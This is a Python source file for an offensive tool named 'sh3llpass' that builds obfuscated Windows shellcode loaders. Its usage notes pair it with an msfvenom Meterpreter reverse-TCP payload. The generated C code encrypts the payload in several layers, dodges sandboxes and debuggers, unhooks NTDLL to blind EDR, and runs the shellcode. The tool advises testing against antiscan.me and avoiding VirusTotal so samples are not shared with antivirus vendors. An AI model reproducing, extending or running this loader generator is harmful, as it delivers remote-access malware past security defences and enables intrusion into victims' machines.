#!/usr/bin/env python3
"""
sh3llpass - Shellcode Obfuscator & EXE Builder
Multi-layer AV/EDR bypass shellcode loader generator.

Usage:
  1) msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f raw -o shellcode.raw
  2) python3 shellforge.py shellcode.raw -o implant.exe
"""

import argparse
import os
import random
import string
import subprocess
import sys
import tempfile


# ─────────────────────────── UTILS ───────────────────────────

def rand_name(length=12):
    return "".join(random.choices(string.ascii_lowercase, k=length))


def rand_var():
    return rand_name(random.randint(8, 16))


def rand_key(length=16):
    return os.urandom(length)


# ─────────────────────────── ENCRYPTION LAYERS ───────────────────────────

def xor_encrypt(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])


def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    result = bytearray()
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        result.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(result)


# ─────────────────────────── OBFUSCATION TRANSFORMS ───────────────────────────

def insert_junk_bytes(data: bytes, interval: int = 4) -> tuple:
    """He"""
    result = bytearray()
    count = 0
    for b in data:
        result.append(b)
        count += 1
        if count % interval == 0:
            result.append(random.randint(0, 255))
    return bytes(result), interval


def byte_swap_pairs(data: bytes) -> bytes:
    arr = bytearray(data)
    for i in range(0, len(arr) - 1, 2):
        arr[i], arr[i + 1] = arr[i + 1], arr[i]
    return bytes(arr)


def add_delta_encode(data: bytes, delta: int) -> bytes:
    return bytes([(b + delta) % 256 for b in data])


# ─────────────────────────── C SOURCE GENERATOR ───────────────────────────

def to_c_array(data: bytes, var_name: str) -> str:
    lines = []
    for i in range(0, len(data), 16):
        chunk = data[i : i + 16]
        hex_str = ", ".join(f"0x{b:02x}" for b in chunk)
        lines.append(f"    {hex_str}")
    return f"unsigned char {var_name}[] = {{\n" + ",\n".join(lines) + "\n};"


def key_to_c_array(data: bytes, var_name: str) -> str:
    hex_str = ", ".join(f"0x{b:02x}" for b in data)
    return f"unsigned char {var_name}[] = {{ {hex_str} }};"


def generate_c_source(shellcode_raw: bytes) -> str:
    original_size = len(shellcode_raw)

    # Layer 1: XOR
    xor_key = rand_key(32)
    layer1 = xor_encrypt(shellcode_raw, xor_key)

    # Layer 2: RC4
    rc4_key = rand_key(16)
    layer2 = rc4_encrypt(layer1, rc4_key)

    # Layer 3: Byte swap
    layer3 = byte_swap_pairs(layer2)

    # Layer 4: Junk bytes
    junk_interval = random.randint(3, 6)
    layer4, interval = insert_junk_bytes(layer3, junk_interval)

    # Layer 5: Delta
    delta = random.randint(1, 254)
    layer5 = add_delta_encode(layer4, delta)

    enc_size = len(layer5)

    # Randomized C variable names
    v_enc = rand_var()
    v_xor_key = rand_var()
    v_rc4_key = rand_var()
    v_tmp = rand_var()
    v_clean = rand_var()
    v_dec = rand_var()
    v_s = rand_var()
    v_exec = rand_var()
    v_oldp = rand_var()
    v_thr = rand_var()
    v_freq = rand_var()
    v_t1 = rand_var()
    v_t2 = rand_var()
    v_elapsed = rand_var()
    v_mem = rand_var()
    v_si = rand_var()
    v_hfile = rand_var()
    v_hmap = rand_var()
    v_fresh = rand_var()
    v_loaded = rand_var()
    v_dos = rand_var()
    v_nt = rand_var()
    v_sec = rand_var()
    v_oprot = rand_var()

    enc_array = to_c_array(layer5, v_enc)
    xor_array = key_to_c_array(xor_key, v_xor_key)
    rc4_array = key_to_c_array(rc4_key, v_rc4_key)

    c_source = f"""\
/* sh3llpass - Auto-generated loader | {rand_name(8)} */
#include <windows.h>
#include <string.h>

#pragma comment(lib, "kernel32.lib")
#pragma comment(linker, "/SUBSYSTEM:WINDOWS")

// Encrypted payload
{enc_array}

// Keys
{xor_array}
{rc4_array}

#define JUNK_INTERVAL  {junk_interval}
#define DELTA_VAL      {delta}
#define ORIGINAL_SIZE  {original_size}
#define ENCODED_SIZE   {enc_size}
#define XOR_KEYLEN     {len(xor_key)}
#define RC4_KEYLEN     {len(rc4_key)}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {{

    /* ── Sandbox & Debugger Evasion ── */
    LARGE_INTEGER {v_freq}, {v_t1}, {v_t2};
    QueryPerformanceFrequency(&{v_freq});
    QueryPerformanceCounter(&{v_t1});
    Sleep(1500);
    QueryPerformanceCounter(&{v_t2});
    double {v_elapsed} = (double)({v_t2}.QuadPart - {v_t1}.QuadPart) / (double){v_freq}.QuadPart;
    if ({v_elapsed} < 1.0) return 0;

    MEMORYSTATUSEX {v_mem};
    {v_mem}.dwLength = sizeof({v_mem});
    GlobalMemoryStatusEx(&{v_mem});
    if ({v_mem}.ullTotalPhys < (2ULL * 1024 * 1024 * 1024)) return 0;

    SYSTEM_INFO {v_si};
    GetSystemInfo(&{v_si});
    if ({v_si}.dwNumberOfProcessors < 2) return 0;

    if (IsDebuggerPresent()) return 0;

    /* ── NTDLL Unhooking ── */
    HANDLE {v_hfile} = CreateFileA("C:\\\\Windows\\\\System32\\\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if ({v_hfile} != INVALID_HANDLE_VALUE) {{
        HANDLE {v_hmap} = CreateFileMapping({v_hfile}, NULL,
            PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
        if ({v_hmap}) {{
            LPVOID {v_fresh} = MapViewOfFile({v_hmap}, FILE_MAP_READ, 0, 0, 0);
            if ({v_fresh}) {{
                HMODULE {v_loaded} = GetModuleHandleA("ntdll.dll");
                PIMAGE_DOS_HEADER {v_dos} = (PIMAGE_DOS_HEADER){v_loaded};
                PIMAGE_NT_HEADERS {v_nt} = (PIMAGE_NT_HEADERS)
                    ((BYTE*){v_loaded} + {v_dos}->e_lfanew);
                PIMAGE_SECTION_HEADER {v_sec} = IMAGE_FIRST_SECTION({v_nt});
                for (WORD ui = 0; ui < {v_nt}->FileHeader.NumberOfSections; ui++) {{
                    if (strcmp((char*){v_sec}[ui].Name, ".text") == 0) {{
                        DWORD {v_oprot};
                        VirtualProtect(
                            (BYTE*){v_loaded} + {v_sec}[ui].VirtualAddress,
                            {v_sec}[ui].Misc.VirtualSize,
                            PAGE_EXECUTE_READWRITE, &{v_oprot});
                        memcpy(
                            (BYTE*){v_loaded} + {v_sec}[ui].VirtualAddress,
                            (BYTE*){v_fresh} + {v_sec}[ui].VirtualAddress,
                            {v_sec}[ui].Misc.VirtualSize);
                        VirtualProtect(
                            (BYTE*){v_loaded} + {v_sec}[ui].VirtualAddress,
                            {v_sec}[ui].Misc.VirtualSize,
                            {v_oprot}, &{v_oprot});
                        break;
                    }}
                }}
                UnmapViewOfFile({v_fresh});
            }}
            CloseHandle({v_hmap});
        }}
        CloseHandle({v_hfile});
    }}

    /* ── Multi-layer Decryption ── */

    // Layer 1: Reverse delta encoding
    unsigned char {v_tmp}[ENCODED_SIZE];
    memcpy({v_tmp}, {v_enc}, ENCODED_SIZE);
    for (int a = 0; a < ENCODED_SIZE; a++) {{
        {v_tmp}[a] = (unsigned char)(({v_tmp}[a] + 256 - DELTA_VAL) & 0xFF);
    }}

    // Layer 2: Remove junk bytes
    unsigned char {v_clean}[ORIGINAL_SIZE];
    int ri = 0;
    int cnt = 0;
    for (int a = 0; a < ENCODED_SIZE && ri < ORIGINAL_SIZE; a++) {{
        cnt++;
        if (cnt % (JUNK_INTERVAL + 1) == 0) {{
            continue;
        }}
        {v_clean}[ri++] = {v_tmp}[a];
    }}

    // Layer 3: Reverse byte-pair swap
    for (int a = 0; a < ORIGINAL_SIZE - 1; a += 2) {{
        unsigned char tb = {v_clean}[a];
        {v_clean}[a] = {v_clean}[a + 1];
        {v_clean}[a + 1] = tb;
    }}

    // Layer 4: RC4 decrypt
    unsigned char {v_s}[256];
    for (int a = 0; a < 256; a++) {v_s}[a] = (unsigned char)a;
    int rj = 0;
    for (int a = 0; a < 256; a++) {{
        rj = (rj + {v_s}[a] + {v_rc4_key}[a % RC4_KEYLEN]) % 256;
        unsigned char tb = {v_s}[a];
        {v_s}[a] = {v_s}[rj];
        {v_s}[rj] = tb;
    }}

    unsigned char {v_dec}[ORIGINAL_SIZE];
    int ri2 = 0;
    rj = 0;
    for (int a = 0; a < ORIGINAL_SIZE; a++) {{
        ri2 = (ri2 + 1) % 256;
        rj = (rj + {v_s}[ri2]) % 256;
        unsigned char tb = {v_s}[ri2];
        {v_s}[ri2] = {v_s}[rj];
        {v_s}[rj] = tb;
        {v_dec}[a] = {v_clean}[a] ^ {v_s}[({v_s}[ri2] + {v_s}[rj]) % 256];
    }}

    // Layer 5: XOR final decrypt
    for (int a = 0; a < ORIGINAL_SIZE; a++) {{
        {v_dec}[a] ^= {v_xor_key}[a % XOR_KEYLEN];
    }}

    /* ── Execute: RW -> copy -> RX (no RWX) ── */
    LPVOID {v_exec} = VirtualAlloc(NULL, ORIGINAL_SIZE,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!{v_exec}) return 0;

    memcpy({v_exec}, {v_dec}, ORIGINAL_SIZE);
    SecureZeroMemory({v_dec}, ORIGINAL_SIZE);

    DWORD {v_oldp};
    VirtualProtect({v_exec}, ORIGINAL_SIZE, PAGE_EXECUTE_READ, &{v_oldp});

    HANDLE {v_thr} = CreateThread(NULL, 0,
        (LPTHREAD_START_ROUTINE){v_exec}, NULL, 0, NULL);
    WaitForSingleObject({v_thr}, INFINITE);

    return 0;
}}
"""
    return c_source


# ─────────────────────────── COMPILER ───────────────────────────

def compile_exe(c_source: str, output_path: str, arch: str = "x64") -> bool:
    tmp_c = tempfile.NamedTemporaryFile(
        suffix=".c", delete=False, mode="w", encoding="utf-8"
    )
    tmp_c.write(c_source)
    tmp_c.close()

    compiler = (
        "x86_64-w64-mingw32-gcc" if arch == "x64" else "i686-w64-mingw32-gcc"
    )

    cmd = [
        compiler,
        tmp_c.name,
        "-o", output_path,
        "-s",
        "-Os",
        "-fno-ident",
        "-fno-asynchronous-unwind-tables",
        "-mwindows",
        "-lkernel32",
        "-luser32",
        "-Wl,--dynamicbase,--nxcompat",
    ]

    print(f"[*] Compiling with: {compiler}")
    print(f"[*] Command: {' '.join(cmd)}")

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        if result.returncode != 0:
            print(f"[!] Compilation failed:\n{result.stderr}")
            return False
        size = os.path.getsize(output_path)
        print(f"[+] Successfully compiled: {output_path}")
        print(f"[+] File size: {size} bytes")
        return True
    except FileNotFoundError:
        print(f"[!] Compiler '{compiler}' not found.")
        print("[*] Install with: sudo apt install mingw-w64")
        src_out = output_path.replace(".exe", ".c")
        with open(src_out, "w", encoding="utf-8") as f:
            f.write(c_source)
        print(f"[*] C source saved to {src_out} — compile manually:")
        print(f"    {compiler} {src_out} -o {output_path} -s -Os -mwindows")
        return False
    finally:
        try:
            os.unlink(tmp_c.name)
        except OSError:
            pass


# ─────────────────────────── MAIN ───────────────────────────

def main():
    banner = r"""
    ╔═══════════════════════════════════════════╗
    ║   sh3llpass  v1.0                         ║
    ║   Multi-Layer Shellcode Obfuscator        ║
    ║   @k1LLuxw                                ║
    ╚═══════════════════════════════════════════╝
    """
    print(banner)

    parser = argparse.ArgumentParser(
        description="sh3llpass - Shellcode Obfuscator & EXE Builder"
    )
    parser.add_argument(
        "shellcode", help="Path to raw shellcode file (e.g. shellcode.raw)"
    )
    parser.add_argument(
        "-o", "--output", default="implant.exe", help="Output EXE filename"
    )
    parser.add_argument(
        "-a", "--arch", choices=["x64", "x86"], default="x64",
        help="Target architecture"
    )
    parser.add_argument(
        "-c", "--c-only", action="store_true",
        help="Only generate C source, skip compilation"
    )
    parser.add_argument(
        "-s", "--source-out", default=None,
        help="Save generated C source to file"
    )

    args = parser.parse_args()

    if not os.path.exists(args.shellcode):
        print(f"[!] File not found: {args.shellcode}")
        sys.exit(1)

    with open(args.shellcode, "rb") as f:
        shellcode = f.read()

    if len(shellcode) == 0:
        print("[!] Shellcode file is empty.")
        sys.exit(1)

    print(f"[*] Loaded shellcode: {len(shellcode)} bytes")
    print(f"[*] Target arch: {args.arch}")
    print("[*] Applying obfuscation layers...")
    print("    ├── Layer 1: XOR (32-byte key)")
    print("    ├── Layer 2: RC4 (16-byte key)")
    print("    ├── Layer 3: Byte-pair swap")
    print("    ├── Layer 4: Junk byte insertion")
    print("    └── Layer 5: Delta encoding")
    print("[*] Generating evasion features...")
    print("    ├── Sleep-based timing check")
    print("    ├── Hardware fingerprinting (RAM/CPU)")
    print("    ├── Debugger detection")
    print("    ├── NTDLL unhooking (fresh copy)")
    print("    ├── RW → RX memory transition (no RWX)")
    print("    └── Randomized variable/function names")

    c_source = generate_c_source(shellcode)

    if args.source_out or args.c_only:
        source_path = args.source_out or "loader.c"
        with open(source_path, "w", encoding="utf-8") as f:
            f.write(c_source)
        print(f"[+] C source saved: {source_path}")

    if args.c_only:
        print("[*] C-only mode. Compile manually:")
        src = args.source_out or "loader.c"
        print(f"    x86_64-w64-mingw32-gcc {src} -o {args.output} -s -Os -mwindows")
        return

    success = compile_exe(c_source, args.output, args.arch)

    if success:
        print(f"\n[+] Done! Output: {args.output}")
        print("[*] Each run generates unique keys/variables (polymorphic)")
        print("[*] Test with: antiscan.me (do NOT use VirusTotal)")


if __name__ == "__main__":
    main()
